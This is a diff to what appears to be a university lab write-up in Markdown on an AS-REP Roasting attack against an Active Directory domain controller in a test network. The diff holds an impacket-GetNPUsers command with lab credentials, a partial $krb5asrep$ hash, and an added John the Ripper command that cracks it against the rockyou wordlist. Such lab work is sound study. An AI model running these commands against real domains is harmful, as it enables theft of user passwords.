@@ -98,10 +98,9 @@ As first attempt, we ask the DomainController the list of all accounts that can 
  3. **Ask for a TGT for these accounts:**
  Using the following command we ask the DC for a TGT foreach of the previous accounts and we format them so that they are ready to be cracked using *John the Ripper*:
 
-    `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request`
-     `-format john`
+    `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request -format john`
 
-	From the output, we copy the string referring to the desired account (*as shown below*) in a **text file** called usernamex.txt and placed on the desktop `./Desktop/usernames.txt`.
+	From the output, we copy the string referring to the desired account (*as shown below*) in a **text file** called `usernames.txt` and located on the desktop.
 	
 	   `$krb5asrep$DNSoperator@CYBERSEC.UNITS.IT:8690a5aa5b288a036a49126539f292ef$afe3e87aafc
 	    35690745c5dfeb1f459dcc1ed858f1f4755d3aefa12921c93dbc35b35c0fd6094be7390eab67e0c016f96
@@ -116,6 +115,7 @@ As first attempt, we ask the DomainController the list of all accounts that can 
  As said, we will now try to crack the password used for encoding the response obtained together with the TGT, performing a so-called AS-Rep Roasting attack.
 	For doing so, we will use **John the Ripper**, basing the offline-guessing activity on a password dictionary called `rockyou`.
 	
+    `john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep ./Desktop/usernames.txt`
 
  
  5. ff
@@ -131,10 +131,10 @@ As first attempt, we ask the DomainController the list of all accounts that can 
 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjY4Mzg2ODQ5LC0xMDg3MzM5MjQyLC0xOD
-E5ODE1MjkyLDI3MTczNDQ0Niw5MDcwMzI3OCwxNzM2Mzk3OTcy
-LDEyMTIyNDQxNDMsMTU2NTgwMDI4NywtMjkyNTQzOTM0LC0xND
-Q3Mzg4MzYwLC0yMDk3Njc4ODYzLDEwOTYxODAxMTUsLTE4MTQ1
-NzI5MDgsLTIxMTIwMTA1ODgsLTQ3Mjg2OTkzNywtMTI0NzcwNj
-kxMV19
+eyJoaXN0b3J5IjpbMTIzODIyODI0NiwtMTA4NzMzOTI0MiwtMT
+gxOTgxNTI5MiwyNzE3MzQ0NDYsOTA3MDMyNzgsMTczNjM5Nzk3
+MiwxMjEyMjQ0MTQzLDE1NjU4MDAyODcsLTI5MjU0MzkzNCwtMT
+Q0NzM4ODM2MCwtMjA5NzY3ODg2MywxMDk2MTgwMTE1LC0xODE0
+NTcyOTA4LC0yMTEyMDEwNTg4LC00NzI4Njk5MzcsLTEyNDc3MD
+Y5MTFdfQ==
 -->
